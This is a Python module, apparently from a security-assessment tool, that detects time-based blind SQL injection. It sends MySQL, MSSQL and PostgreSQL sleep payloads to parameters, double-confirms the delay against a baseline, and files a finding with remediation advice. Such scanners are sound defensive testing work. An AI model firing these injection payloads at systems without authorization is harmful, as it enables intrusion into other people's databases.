"""Time-based blind SQL injection.

For the no-error, no-egress case: inject a dialect SLEEP payload and confirm the response
is delayed by ~the sleep time versus a baseline — double-confirmed to rule out network
jitter. Bounded (SLEEP payloads are slow). Deterministic signal (consistent delay).
"""

from __future__ import annotations

import secrets as _secrets
import time
from collections.abc import Callable

from owlforge.engine.classify import SQLI, classify_param

_DELAY = 5
_THRESHOLD_MS = 3800   # injected must exceed baseline by at least this (sleep ~5s)
_PAYLOADS = (
    f"1' AND SLEEP({_DELAY})-- -",                        # MySQL (string ctx)
    f"1 AND SLEEP({_DELAY})",                             # MySQL (numeric ctx)
    f"1'; WAITFOR DELAY '0:0:{_DELAY}'-- -",              # MSSQL
    f"1' || pg_sleep({_DELAY})-- -",                      # PostgreSQL
    f"1' AND 1=(SELECT 1 FROM pg_sleep({_DELAY}))-- -",   # PostgreSQL (alt)
)


def _timed(sandbox, method, url, param, value, headers):
    """Return (status, elapsed_ms) for one request, body-aware."""
    from owlforge.engine.preprobe import _send
    t0 = time.monotonic()
    r = _send(sandbox, method, url, param, value, headers) or {}
    wall = int((time.monotonic() - t0) * 1000)
    el = r.get("elapsed_ms")
    return int(r.get("status") or 0), (int(el) if el is not None else wall)


def _sqli_params(inventory):
    seen, out = set(), []
    for it in inventory:
        for p in (it.get("params") or []):
            if SQLI in classify_param(p):
                key = (it["url"], p)
                if key not in seen:
                    seen.add(key)
                    out.append({"url": it["url"], "param": p,
                                "method": (it.get("method") or "GET").upper()})
    return out


def _file(assessment_id, url, method, param, payload):
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    with session() as s:
        s.add(Finding(
            id=f"find_{_secrets.token_hex(5)}", assessment_id=assessment_id,
            title=f"Blind SQL injection (time-based) via '{param}'",
            severity="high", status="validated", confidence="high",
            endpoint=url, method=method,
            technical_analysis=(f"Injecting a time-delay payload into '{param}' ({method} "
                                f"{url}) delayed the response by ~{_DELAY}s versus baseline, "
                                "confirmed on a repeat request — the parameter is SQL-injectable."),
            proof_of_concept=f"{param} = {payload}  ->  response delayed ~{_DELAY}s (x2)",
            impact="Full read (and often write) access to the backend database.",
            remediation="Use parameterized queries / prepared statements; never concatenate "
                        "input into SQL.",
            validation_note="time-based blind SQLi, double-confirmed (deterministic)"))
        s.commit()


def time_based_sqli_scan(assessment_id, inventory, sandbox, session_headers,
                         log: Callable[[str], None] = lambda m: None) -> int:
    if sandbox is None:
        return 0
    targets = _sqli_params(inventory)[:6]
    if not targets:
        return 0
    filed = 0
    for t in targets:
        _s, base = _timed(sandbox, t["method"], t["url"], t["param"], "1", session_headers)
        if base >= _THRESHOLD_MS:
            continue  # endpoint already slow -> timing is unreliable
        for payload in _PAYLOADS:
            _s1, t1 = _timed(sandbox, t["method"], t["url"], t["param"], payload, session_headers)
            if t1 - base < _THRESHOLD_MS:
                continue
            _s2, t2 = _timed(sandbox, t["method"], t["url"], t["param"], payload, session_headers)
            if t2 - base >= _THRESHOLD_MS:   # confirmed twice -> not jitter
                _file(assessment_id, t["url"], t["method"], t["param"], payload)
                filed += 1
                break
    if filed:
        log(f"blind-sqli: {filed} time-based SQL injection(s) confirmed")
    return filed
